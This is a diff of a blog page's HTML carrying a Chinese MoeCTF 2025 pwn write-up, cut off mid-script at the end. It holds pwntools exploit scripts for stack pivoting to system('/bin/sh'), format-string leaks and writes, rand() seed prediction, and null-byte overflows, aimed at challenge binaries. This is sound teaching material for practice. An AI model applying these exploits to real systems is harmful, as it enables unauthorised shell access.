@@ -478,7 +495,10 @@
 <p>4.过程</p>
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">ROPgadget --binary libc.<span class="hljs-keyword">so</span>.<span class="hljs-number">6</span> --<span class="hljs-keyword">only</span> <span class="hljs-string">&quot;pop|ret&quot;</span>|<span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;rdi&quot;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755841558005-fe2dcf43-cbea-4c15-a68f-ee5ff5c040fe.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755841558005-fe2dcf43-cbea-4c15-a68f-ee5ff5c040fe.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+
+
 <p>5.反思：</p>
 <ol>
 <li>没有改变环境利用给的libc就打本地导致一直失败</li>
@@ -489,9 +509,16 @@
 <h1 id="6-栈迁移"><a href="#6-栈迁移" class="headerlink" title="6.栈迁移"></a>6.栈迁移</h1><ol>
 <li></li>
 </ol>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755916971671-b9393331-9311-4ed8-aa10-fcd2d920babe.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755916984235-aef77fb6-2a3c-4077-810c-4c7b2c03c49f.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755916998040-57c93a37-314a-4287-be61-2861f7f74f50.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755916971671-b9393331-9311-4ed8-aa10-fcd2d920babe.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755916984235-aef77fb6-2a3c-4077-810c-4c7b2c03c49f.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755916998040-57c93a37-314a-4287-be61-2861f7f74f50.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+
+
+
+
 <p>2.代码审计：</p>
 <ul>
 <li>输入n32判断是否大于32</li>
@@ -516,7 +543,8 @@
 <p>4.伪造栈帧结构，把伪造栈写入.bss</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">payload1 = b&quot;\x00&quot;*8*0x100 \<br>           + p64(pop_rbp) \<br>           + p64(an_addr) \<br>           + p64(rdi_ret) \<br>           + p64(des_addr+0x800+0x28) \<br>           + p64(system) \<br>           + b&#x27;/bin/sh\x00&#x27;<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755918310961-1b070c98-1c13-4f77-a741-e005bd08fdef.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755918310961-1b070c98-1c13-4f77-a741-e005bd08fdef.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <p>pop rbp其实就是让返回地址为an_addr一个安全的地址</p>
 <p>然后写入rdi参数，调用system即可</p>
 <p>5.触发栈迁移</p>
@@ -525,7 +553,10 @@
 <h1 id="7-格式化字符串漏洞"><a href="#7-格式化字符串漏洞" class="headerlink" title="7.格式化字符串漏洞"></a>7.格式化字符串漏洞</h1><ol>
 <li></li>
 </ol>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755932572940-6a2b1f03-b49f-47f6-9392-0d54a467343d.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755932572940-6a2b1f03-b49f-47f6-9392-0d54a467343d.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+
+
 <p>2.代码审计</p>
 <ul>
 <li>随机生成字符串s2与p_s2</li>
@@ -546,14 +577,22 @@
 <li>传入b’%7$s%10$p’【%s是</li>
 <li>接收再输入即可（也可以直接在程序输入查看输出）</li>
 </ol>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755933058076-c8d23592-628e-4030-8e3f-910adcb23978.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755932505506-d0e5b3ff-12a6-49f2-b78e-221df40da0fa.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755933058076-c8d23592-628e-4030-8e3f-910adcb23978.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755932505506-d0e5b3ff-12a6-49f2-b78e-221df40da0fa.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+
+
 <p>5.构造payload</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs shell">from pwn import *<br>import sys<br>import re<br><br>context(log_level=&quot;debug&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)<br>p = process(&quot;./pwn&quot;)<br>elf = ELF(&quot;./pwn&quot;)<br>libc = ELF(&quot;./libc.so.6&quot;)<br><br>payload = b&quot;%7$s%10$p&quot;<br><br><br>p.sendline(payload)<br><br>p.recvuntil(&quot;Nice to meet you,&quot;)<br><br>data_line = p.recvline().strip()<br>v4 = data_line[:5].decode()       <br>s2_hex = data_line[5:].decode()  <br>s2_value = int(s2_hex, 16)      <br><br>print(f&quot;v4 = &#123;v4&#125;&quot;)<br>print(f&quot;s2 = &#123;hex(s2_value)&#125;&quot;)<br><br><br><br><br>s2_bytes = s2_value.to_bytes(8, &#x27;little&#x27;)<br>s2 = s2_bytes[:5]  <br><br><br><br>p.recvuntil(&quot;I buried two treasures on the stack.Can you find them?&quot;)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">gdb.attach(p)</span><br><br>p.sendline(s2)<br><br>p.recvuntil(&quot;Yeah,another one?\n&quot;)<br><br>p.sendline(v4)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
 
-<h1 id="8-rand（）伪随机"><a href="#8-rand（）伪随机" class="headerlink" title="8.rand（）伪随机"></a>8.rand（）伪随机</h1><p>1.<img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755938559444-7f4bda61-43d6-471a-87fa-f28b93ead6c4.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755938576026-7c5eb861-754b-45a9-8ffa-0d44ea0fcc8d.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755938589065-bcc3423c-14fd-4a70-bbe3-dc8233829798.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h1 id="8-rand（）伪随机"><a href="#8-rand（）伪随机" class="headerlink" title="8.rand（）伪随机"></a>8.rand（）伪随机</h1><p>1.<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755938559444-7f4bda61-43d6-471a-87fa-f28b93ead6c4.png" srcset="/img/loading.gif" lazyload class="" title="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755938576026-7c5eb861-754b-45a9-8ffa-0d44ea0fcc8d.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755938589065-bcc3423c-14fd-4a70-bbe3-dc8233829798.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+
+
 <p>2.代码审计</p>
 <ul>
 <li>系统需要我们猜测10个值，猜到了就进入win获得flag</li>
@@ -565,7 +604,7 @@
 <ul>
 <li>伪造seed的值为1</li>
 <li>获得数据输入即可（靠单个ai说seed是随机的导致我差点想尝试枚举50个数据）</li>
-<li><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755939144929-0ed2654e-e2f5-4f07-b3b0-2c356ff8ae19.png" srcset="/img/loading.gif" lazyload alt="img"></li>
+<li><img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755939144929-0ed2654e-e2f5-4f07-b3b0-2c356ff8ae19.png" srcset="/img/loading.gif" lazyload class="" title="img"></li>
 </ul>
 <p>高手的exp：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs shell">from pwn import *<br>import sys<br>import ctypes<br><br>p = process(&quot;./pwn&quot;)<br><br><br><br>def simulate_seed_transformation(init_seed):<br>    &quot;&quot;&quot;模拟种子变换过程（不依赖libc）&quot;&quot;&quot;<br>    seed = init_seed<br><br>    for _ in range(120):<br>        if seed &amp; 1:<br>            seed = (3 * seed + 1) &amp; 0xFFFFFFFF<br>        else:<br>            seed = seed &gt;&gt; 1<br><br>    while seed % 2 == 0:<br>        if seed &amp; 1:<br>            seed = (3 * seed + 1) &amp; 0xFFFFFFFF<br>        else:<br>            seed = seed &gt;&gt; 1<br>    return seed<br><br>def main():<br>    #host = &quot;目标IP&quot;<br>    #port = 目标端口<br>    libc_path = &quot;/lib/x86_64-linux-gnu/libc.so.6&quot;  # 替换为实际libc路径<br>    <br><br>    try:<br>        libc = ctypes.CDLL(libc_path)<br>    except:<br>        log.error(f&quot;无法加载libc: &#123;libc_path&#125;&quot;)<br>        return<br>    <br><br>    for init_seed in range(1, 101):<br>        try:<br>            #r = remote(host, port)<br>            r = process(&quot;./pwn&quot;)<br>            r.recvuntil(&quot;My lock looks strange—can you help me?&quot;)<br>            <br><br>            final_seed = simulate_seed_transformation(init_seed)<br>            libc.srand(final_seed)<br>            <br><br>            passwords = []<br>            for i in range(10):<br>                rand_val = libc.rand() % 10000<br>                passwords.append(str(rand_val))<br>            <br><br>            for i in range(10):<br>                r.recvuntil(f&quot;password &#123;i+1&#125;\n&gt;&quot;)<br>                r.sendline(passwords[i])<br>            <br><br>            response = r.recvline(timeout=1)<br>            if b&#x27;It opened&#x27; in response:<br>                flag = r.recvall().decode()<br>                log.success(f&quot;成功! 种子=&#123;init_seed&#125;, flag=&#123;flag&#125;&quot;)<br>                r.close()<br>                return<br>            r.close()<br>        except Exception as e:<br>            log.warning(f&quot;种子 &#123;init_seed&#125; 失败: &#123;str(e)&#125;&quot;)<br>            try: r.close()<br>            except: pass<br>    <br>    log.error(&quot;所有种子尝试失败&quot;)<br><br>if __name__ == &quot;__main__&quot;:<br>    main()<br><br><br><br><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>
@@ -573,7 +612,8 @@
 <h1 id="9-0截断"><a href="#9-0截断" class="headerlink" title="9.\0截断"></a>9.\0截断</h1><ol>
 <li></li>
 </ol>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755948461570-f21ed1e5-3175-421c-ad28-d0967594823d.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755948461570-f21ed1e5-3175-421c-ad28-d0967594823d.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <p>2.依旧代码审计</p>
 <ul>
 <li>输入str字符串</li>
@@ -590,9 +630,15 @@
 <p>4.payload</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">from pwn import *<br><span class="hljs-meta prompt_">#</span><span class="language-bash">r = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)</span><br>r = remote (&#x27;192.168.136.1&#x27;,54625)<br>elf = ELF(&#x27;./pwn&#x27;)<br><br>system_abbr = 0x40123E<br><br><br>offset = 40<br><br><br>r.recvuntil(&quot;What can u say?&quot;)<br>payload1 =  b&quot;meow\0&quot;+ b&quot;A&quot; * (offset - 5) + p64(system_abbr)<br><br>r.sendline(payload1)<br><br>r.recvuntil(&quot;So,what size is it?&quot;)<br>r.sendline(str(50).encode())<br><br>r.interactive()<br></code></pre></td></tr></table></figure>
 
-<h1 id="10-syslock"><a href="#10-syslock" class="headerlink" title="10.syslock"></a>10.syslock</h1><p>1.<img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1756099790897-46d29d19-8bde-4230-86fc-aa4b93e5b3e8.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1756100042367-d31abaeb-4a1d-4814-bffa-837b5aaf8622.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1756099815672-4c2b5314-395b-4de7-b9a4-5bd6bc1c1062.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h1 id="10-syslock"><a href="#10-syslock" class="headerlink" title="10.syslock"></a>10.syslock</h1><p>1.<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1756099790897-46d29d19-8bde-4230-86fc-aa4b93e5b3e8.png" srcset="/img/loading.gif" lazyload class="" title="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1756100042367-d31abaeb-4a1d-4814-bffa-837b5aaf8622.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+
+
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1756099815672-4c2b5314-395b-4de7-b9a4-5bd6bc1c1062.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+
+
 <p>2.代码审计</p>
 <ul>
 <li>要求输入i使其小于4</li>
@@ -622,11 +668,20 @@
 <h1 id="11-栈残留"><a href="#11-栈残留" class="headerlink" title="11.栈残留"></a>11.栈残留</h1><ol>
 <li></li>
 </ol>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1756114366008-3c885c6d-0997-4936-9cdd-637b582ff9b4.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1756114389828-c01c4f41-8e16-4fb4-b02c-cee58519adf8.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1756114403864-91e3ed0c-1e8d-461b-9f9f-f33d4cb7c314.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1756114415797-3549688b-91dc-4e13-a231-ffc69cfe06fc.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1756114547934-b8b51370-b08f-407c-adce-2f8b59142f3c.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1756114366008-3c885c6d-0997-4936-9cdd-637b582ff9b4.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1756114389828-c01c4f41-8e16-4fb4-b02c-cee58519adf8.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1756114403864-91e3ed0c-1e8d-461b-9f9f-f33d4cb7c314.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1756114415797-3549688b-91dc-4e13-a231-ffc69cfe06fc.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+
+
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1756114547934-b8b51370-b08f-407c-adce-2f8b59142f3c.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+
+
 <p>2.代码审计：</p>
 <ul>
 <li>给了三个选择，1，2，3分别进入不同函数</li>
@@ -648,8 +703,10 @@
 <ol>
 <li></li>
 </ol>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1756296023692-60e92638-abdb-4a7e-ab39-f8faf20cceed.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1756296042610-0f26d909-0761-44e7-a16b-9db382e7cf3e.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1756296023692-60e92638-abdb-4a7e-ab39-f8faf20cceed.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1756296042610-0f26d909-0761-44e7-a16b-9db382e7cf3e.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <ol start="2">
 <li></li>
 </ol>
@@ -671,8 +728,10 @@
 <h1 id="13-Canary泄露"><a href="#13-Canary泄露" class="headerlink" title="13.Canary泄露"></a>13.Canary泄露</h1><h1 id="14-伪随机数random"><a href="#14-伪随机数random" class="headerlink" title="14.伪随机数random"></a>14.伪随机数random</h1><ol>
 <li></li>
 </ol>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1757314877348-19acf572-0250-4956-aeaf-14c06849ace2.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1757314975527-3bf051aa-fae0-450a-a363-dd62e2304c06.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1757314877348-19acf572-0250-4956-aeaf-14c06849ace2.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1757314975527-3bf051aa-fae0-450a-a363-dd62e2304c06.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <p>2.代码审计</p>
 <ul>
 <li>程序第一个要求输入y&#x2F;n，y才可进入gets泄露</li>
@@ -696,8 +755,10 @@
 <h1 id="15-PIE部分覆盖与Canary"><a href="#15-PIE部分覆盖与Canary" class="headerlink" title="15.PIE部分覆盖与Canary"></a>15.PIE部分覆盖与Canary</h1><ol>
 <li></li>
 </ol>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1757496484180-60c91d3e-661a-4569-bd91-f9d77fcb08de.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1757496506081-e7a80235-e2aa-4978-8d79-aca034f3e092.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1757496484180-60c91d3e-661a-4569-bd91-f9d77fcb08de.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1757496506081-e7a80235-e2aa-4978-8d79-aca034f3e092.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <p>2.代码审计</p>
 <ul>
 <li>输入buf会被puts打印出来</li>
@@ -716,13 +777,15 @@
 
 <p>命令注入，过滤了很多，但是没有过滤&#x2F;n</p>
 <p>所以可以绕过</p>
-<h1 id="17-非栈上fmt-s"><a href="#17-非栈上fmt-s" class="headerlink" title="17.非栈上fmt_s"></a>17.非栈上fmt_s</h1><p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1763979891565-f285d2a9-4dc1-4039-a43f-e0f0dd7c8aa2.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h1 id="17-非栈上fmt-s"><a href="#17-非栈上fmt-s" class="headerlink" title="17.非栈上fmt_s"></a>17.非栈上fmt_s</h1><img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1763979891565-f285d2a9-4dc1-4039-a43f-e0f0dd7c8aa2.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell">size_t talk()<br>&#123;<br>  puts(&quot;You start talking to him...&quot;);<br>  flag ^= 1u;<br>  read(0, fmt, 0x20u);<br>  printf(fmt);<br>  puts(&quot;?&quot;);<br>  puts(&quot;You enraged the monster-prepare for battle!&quot;);<br>  return my_read(&amp;atk, 8u);<br>&#125;<br>unsigned __int64 he()<br>&#123;<br>  char command[6]; // [rsp+2h] [rbp-Eh] BYREF<br>  unsigned __int64 v2; // [rsp+8h] [rbp-8h]<br><br>  v2 = __readfsqword(0x28u);<br>  qmemcpy(command, &quot;a_flag&quot;, sizeof(command));<br>  puts(&quot;The monster is defeated, and you obtain: flag?&quot;);<br>  system(command);<br>  return v2 - __readfsqword(0x28u);<br>&#125;<br></code></pre></td></tr></table></figure>
 
 
 
 <p>很明显一个格式化字符串漏洞，看看fmt</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1763979961354-afa0332c-af26-40a0-a323-87e9772bd822.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1763979961354-afa0332c-af26-40a0-a323-87e9772bd822.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <p>在bss段上，显然是非栈上的</p>
 <p>还有就是程序如果想要循环flag必须等于0</p>
 <p>而刚好atk输入8字节</p>
@@ -741,7 +804,8 @@
 <p>0x7fffffffdd38 —▸ 0x7fffffffe0ae</p>
 <p>指针修改后0x7fffffffdd38后四字节为ret的</p>
 <p>再修改返回地址0x4013b1为system地址</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1763980445608-5f931a7a-e95b-489b-81d5-4dbd7eb5d259.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1763980445608-5f931a7a-e95b-489b-81d5-4dbd7eb5d259.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <p>最后由于my-read的汇编代码会将输入的move给rdi，所以可以直接getshell</p>
 <p>exp：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell">from pwn import *<br>context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)</span><br>p = remote(&#x27;192.168.136.1&#x27;,57745)<br>elf = ELF(&#x27;./pwn&#x27;)<br>libc = ELF(&#x27;./libc.so.6&#x27;)<br>system = 0x40127B<br><br>payload = b&#x27;%8$p&#x27;<br>p.sendafter(&quot;You start talking to him...\n&quot;, payload)<br>p.recvuntil(&#x27;0x&#x27;)<br>stack_ret = int(p.recv(12), 16) - 0x18<br>p.sendafter(&quot;You enraged the monster-prepare for battle!\n&quot;, &#x27;a&#x27; * 8)<br><br>count = stack_ret &amp; 0xffff<br>payload2 = f&#x27;%&#123;count&#125;c%6$hn&#x27;.format().encode()<br>p.sendafter(&quot;You start talking to him...\n&quot;, payload2)<br>p.sendafter(&quot;You enraged the monster-prepare for battle!\n&quot;, &#x27;a&#x27; * 8)<br><br>count = system &amp; 0xffff<br>payload3 = f&#x27;%&#123;count&#125;c%47$hn&#x27;.format().encode()<br>p.sendafter(&quot;You start talking to him...\n&quot;, payload3)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">gdb.attach(p)</span><br>p.sendafter(&quot;You enraged the monster-prepare for battle!\n&quot;, &#x27;/bin/sh\x00&#x27;)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
@@ -772,10 +836,13 @@
 <p>exp：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs shell">from pwn import *<br>context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)</span><br>p = remote(&#x27;192.168.136.1&#x27;,52807)<br>elf = ELF(&#x27;./pwn&#x27;)<br>libc = ELF(&#x27;./libc.so.6&#x27;)<br><br>new_rbp = 0x404160<br>leave_ret = 0x40127b<br>rdi_ret = 0x40119e<br>read = 0x401264<br>puts_plt = 